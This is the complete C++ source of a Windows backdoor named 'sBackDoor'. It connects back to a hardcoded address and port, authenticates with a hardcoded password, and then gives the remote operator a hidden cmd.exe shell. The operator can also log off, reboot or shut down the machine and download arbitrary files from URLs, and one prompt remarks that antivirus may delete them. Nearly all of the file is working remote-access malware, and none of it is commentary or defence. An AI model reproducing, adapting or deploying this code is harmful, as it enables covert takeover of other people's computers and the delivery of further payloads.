
#include "sBackDoor.h"

BOOL bExit = FALSE;
#define RECV_BUF_LEN 4096
#define CMD_BUF_LEN 500
#define CMD_SHOW_FLAG _T("sBackDoor>")
#define CMD_SHELL_FLAG _T("sBackDoor>sCmdShell>")
#define LOGON_PASSWORD _T("123456")
#define SEND_FLAG(m_Sock, CMD_SHOW_FLAG) (SendData(m_Sock, CMD_SHOW_FLAG, sizeof(CMD_SHOW_FLAG)))

BOOL SocketInit()
{
	WSADATA wsaData = {0};
	if ( WSAStartup(MAKEWORD(2, 2), &wsaData) == NO_ERROR ) {
		return TRUE;
	}else{
		return FALSE;
	}
}

int SendData(SOCKET m_Sock, void *pBuf, DWORD dwBufLen)
{
	if ( m_Sock == INVALID_SOCKET || !pBuf || dwBufLen <= 0 ) {
		return -1;
	}
	int iCurrSend = 0, offset = 0;
	do {
		iCurrSend = send(m_Sock, (char *)pBuf+offset, dwBufLen, 0);
		if ( iCurrSend <= 0 ) {
			break;
		}
		dwBufLen -= iCurrSend;
		offset += iCurrSend;
	} while ( dwBufLen > 0 );
	return offset;
}

DWORD WINAPI ThreadOutputProc(LPVOID lpParam)
{
	CThreadNode tNode = *(CThreadNode *)lpParam;
	char szBuf[RECV_BUF_LEN] = {0};
	DWORD dwReadLen = 0, dwTotalAvail = 0;
	BOOL bRet = FALSE;
	while ( !bExit ) {
		dwTotalAvail = 0;
		bRet = PeekNamedPipe(tNode.hPipe, NULL, 0, NULL, &dwTotalAvail, NULL);
		if ( bRet && dwTotalAvail > 0 ) {
			bRet = ReadFile(tNode.hPipe, szBuf, RECV_BUF_LEN, &dwReadLen, NULL);
			if ( bRet && dwReadLen > 0 ) {
				SendData(tNode.m_Sock, szBuf, dwReadLen);
			}
		}
		Sleep(50);
	}
	return TRUE;
}

BOOL GetCmdString(SOCKET m_Sock, LPTSTR lpszCmdBuf)
{
	if ( m_Sock == INVALID_SOCKET || !lpszCmdBuf ) {
		return FALSE;
	}
	int iRet = 0;
	TCHAR sztBuf[2] = {0}, szCmdBuf[CMD_BUF_LEN] = {0};
	while ( TRUE ) {
		iRet = recv(m_Sock, sztBuf, 1, 0);
		if(iRet ==0 || iRet == SOCKET_ERROR) {
			return FALSE;
		}
		if( sztBuf[0] != '\r' && sztBuf[0] != '\n' ) {
			_tcscat_s(szCmdBuf, CMD_BUF_LEN, sztBuf);	
		}else{
			break;
		}
		Sleep(50);
	}
	if ( _tcslen(szCmdBuf) > 0 ) {
		_tcscpy_s(lpszCmdBuf, CMD_BUF_LEN, szCmdBuf);
	}
	return TRUE;
}

BOOL CheckPassword(SOCKET m_Sock)
{
	int iRecved = 0;
	TCHAR szBuf[2] = {0}, szCmdBuf[CMD_BUF_LEN] = {0};
	TCHAR szPass[] = _T("\r\n请输入密码："), szSucceed[] = _T("登陆成功！\r\n"), szFailed[] = _T("密码错误，登陆失败！\r\n");
	if ( SendData(m_Sock, szPass, _tcslen(szPass)) > 0 && GetCmdString(m_Sock, szCmdBuf) ) {
		//Compare the password;
		if ( _tcscmp(szCmdBuf, LOGON_PASSWORD) == 0 ) {
			SendData(m_Sock, szSucceed, _tcslen(szSucceed));
			return TRUE;
		}else{
			SendData(m_Sock, szFailed, _tcslen(szFailed));
		}
	}
	return FALSE;
}

DWORD WINAPI CmdShellProc(LPVOID lpParam)
{
	SOCKET m_Sock = (SOCKET)lpParam;
	TCHAR szCmdBuf[CMD_BUF_LEN] = {0}, szCmdLine[CMD_BUF_LEN] = {0};
	SECURITY_ATTRIBUTES sa = {0};
	HANDLE hReadPipe = NULL, hWritePipe = NULL;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;

	if ( !CreatePipe(&hReadPipe, &hWritePipe, &sa, 0) ) {
		return FALSE;
	}

	DWORD dwThreadID = 0;
	PROCESS_INFORMATION pi = {0};
	STARTUPINFO si = {0};
	si.cb = sizeof(STARTUPINFO);
	GetStartupInfo(&si);
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.hStdOutput = si.hStdError = hWritePipe;
	si.wShowWindow = SW_HIDE;
	CThreadNode m_ReadNode;
	m_ReadNode.m_Sock = m_Sock;
	m_ReadNode.hPipe = hReadPipe;
	SEND_FLAG(m_Sock, CMD_SHELL_FLAG);
	HANDLE hThread = CreateThread(NULL, 0, ThreadOutputProc, &m_ReadNode, 0, &dwThreadID);
	while( GetCmdString(m_Sock, szCmdBuf) ) {
		if ( _tcslen(szCmdBuf) > 0 ) {
			if ( _tcsicmp(szCmdBuf, _T("exit")) == 0 ) {
				break;
			}
			ZeroMemory(szCmdLine, CMD_BUF_LEN);
			GetSystemDirectory(szCmdLine, CMD_BUF_LEN);
			_tcscat_s(szCmdLine, CMD_BUF_LEN, _T("\\cmd.exe /c "));
			_tcscat_s(szCmdLine, CMD_BUF_LEN, szCmdBuf);
			CreateProcess(NULL, szCmdLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
			WaitForSingleObject(pi.hProcess, INFINITE); //The cmd.exe process is over;
		}
		Sleep(50);
		//SEND_FLAG(m_Sock, CMD_SHELL_FLAG);
	}
	bExit = TRUE;
	WaitForSingleObject(hThread, INFINITE);
	bExit = FALSE;
	return TRUE;
}

BOOL EnableShutDownPriv()
{
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES tkp = {0};
	if ( !OpenProcessToken( GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken ) ) {
		return FALSE;
	}
	if ( !LookupPrivilegeValue( NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid ) ) {
		CloseHandle( hToken );
		return FALSE;
	}
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if ( !AdjustTokenPrivileges( hToken, FALSE, &tkp, sizeof(TOKEN_PRIVILEGES), NULL, NULL ) ) {
		CloseHandle( hToken );
		return FALSE;
	}
	return TRUE;
}

BOOL ReSetWindows(DWORD dwFlags, BOOL bForce)
{
	//Check the param;
	if ( dwFlags != EWX_LOGOFF && dwFlags != EWX_REBOOT && dwFlags != EWX_SHUTDOWN ) {
		return FALSE;
	}

	//Get the os version;
	OSVERSIONINFO osvi = {0};
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	if ( !GetVersionEx(&osvi) ) {
		return FALSE;
	}
	if ( osvi.dwPlatformId == VER_PLATFORM_WIN32_NT ) {
		EnableShutDownPriv();
	}
	dwFlags |= (bForce != FALSE) ? EWX_FORCE : EWX_FORCEIFHUNG;
	return ExitWindowsEx(dwFlags, 0);
}

BOOL CheckFileExist(LPCTSTR lpszPath)
{
	if ( GetFileAttributes(lpszPath) == INVALID_FILE_ATTRIBUTES && GetLastError() == ERROR_FILE_NOT_FOUND ) {
		return FALSE;
	}else{
		return TRUE;
	}
}

BOOL DownFileFunc(SOCKET m_Sock)
{
	if ( m_Sock == INVALID_SOCKET || m_Sock == SOCKET_ERROR ) {
		return FALSE;
	}
	BOOL bRet = TRUE;
	TCHAR szDstUrl[CMD_BUF_LEN] = {0}, szDstPath[CMD_BUF_LEN] = {0};
	if ( SendData(m_Sock, _T("请输入目标文件的URL："), _tcslen(_T("请输入目标文件的URL："))) > 0 && GetCmdString(m_Sock, szDstUrl)) {
		if ( SendData(m_Sock, _T("请输入目标文件的保存路径："), _tcslen(_T("请输入目标文件的保存路径："))) > 0 && GetCmdString(m_Sock, szDstPath) ) {
			while ( CheckFileExist(szDstPath) ) {
				SendData(m_Sock, _T("文件已存在请重新输入路径："), _tcslen(_T("文件已存在请重新输入路径：")));
				GetCmdString(m_Sock, szDstPath);
			}
			SendData(m_Sock, _T("文件下载中，请稍等……\r\n"), _tcslen(_T("文件下载中，请稍等……\r\n")));
			HRESULT hr = URLDownloadToFile(NULL, szDstUrl, szDstPath, 0, NULL);
			if ( hr == S_OK ) {
				if ( CheckFileExist(szDstPath) ) {
					SendData(m_Sock, _T("文件下载成功！\r\n"), _tcslen(_T("文件下载成功！\r\n")));
				}else{
					SendData(m_Sock, _T("文件下载成功，但是文件不存在，很可能被杀毒软件查杀！\r\n"), _tcslen(_T("文件下载成功，但是文件不存在，很可能被杀毒软件查杀！\r\n")));
				}
			}else if ( hr == INET_E_DOWNLOAD_FAILURE ) {
				SendData(m_Sock, _T("URL 不正确，文件下载失败！\r\n"), _tcslen(_T("URL 不正确，文件下载失败！\r\n")));
				bRet = FALSE;
			}else{
				SendData(m_Sock, _T("文件下载失败，请检查URL是否正确！\r\n"), _tcslen(_T("文件下载失败，请检查URL是否正确！\r\n")));
				bRet = FALSE;
			}
		}
	}
	return bRet;
}

BOOL StartWork(SOCKET m_Sock)
{
	int iRet = 0;
	TCHAR sztBuf[2] = {0}, szCmdBuf[CMD_BUF_LEN] = {0};
	SEND_FLAG(m_Sock, CMD_SHOW_FLAG);
	while ( GetCmdString(m_Sock, szCmdBuf) ) {
		if ( _tcslen(szCmdBuf) > 0 ) {
			if ( _tcsicmp(szCmdBuf, _T("cmdshell")) == 0 ) {
				//Start the cmd shell;
				DWORD dwThreadId = 0;
				HANDLE hThread = CreateThread(NULL, 0, CmdShellProc, (LPVOID)m_Sock, 0, &dwThreadId);
				WaitForSingleObject(hThread, INFINITE);
			}else if ( _tcsicmp(szCmdBuf, _T("logoff")) == 0 ) {
				//logoff the system;
				ReSetWindows(EWX_LOGOFF, FALSE);
			}else if ( _tcsicmp(szCmdBuf, _T("reboot")) == 0 ) {
				//reboot the system;
				ReSetWindows(EWX_REBOOT, FALSE);
			}else if ( _tcsicmp(szCmdBuf, _T("shutdown")) == 0 ) {
				//shutdown the system;
				ReSetWindows(EWX_SHUTDOWN, FALSE);
			}else if ( _tcsicmp(szCmdBuf, _T("download")) == 0 ) {
				DownFileFunc(m_Sock);
			}
		}
		SEND_FLAG(m_Sock, CMD_SHOW_FLAG);
	}
	return 0;
}

BOOL StartShell(UINT uPort, LPCSTR lpszIpAddr)
{
	BOOL bRet = TRUE;
	if ( !SocketInit() ) {
		return FALSE;
	}
	SOCKET m_ConnectSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if ( m_ConnectSock == INVALID_SOCKET ) {
		return FALSE;
	}
	sockaddr_in sServer = {0};
	sServer.sin_family = AF_INET;
	sServer.sin_addr.s_addr = inet_addr(lpszIpAddr);
	sServer.sin_port = htons(uPort);

	int iRet = 0;
	do {
		iRet = connect(m_ConnectSock, (sockaddr*)&sServer, sizeof(sServer));
	} while ( iRet == SOCKET_ERROR );

	//Check the password;
	if ( !CheckPassword(m_ConnectSock) ) {
		bRet = FALSE;
		goto __Error_End;
	}

	StartWork(m_ConnectSock);

__Error_End:
	if ( m_ConnectSock != INVALID_SOCKET ) {
		closesocket(m_ConnectSock);
	}
	WSACleanup();
	return bRet;
}

int APIENTRY _tWinMain(HINSTANCE hInstance,
					   HINSTANCE hPrevInstance,
					   LPTSTR    lpCmdLine,
					   int       nCmdShow)
{
	StartShell(9527, _T("192.168.0.2"));
	return 0;
}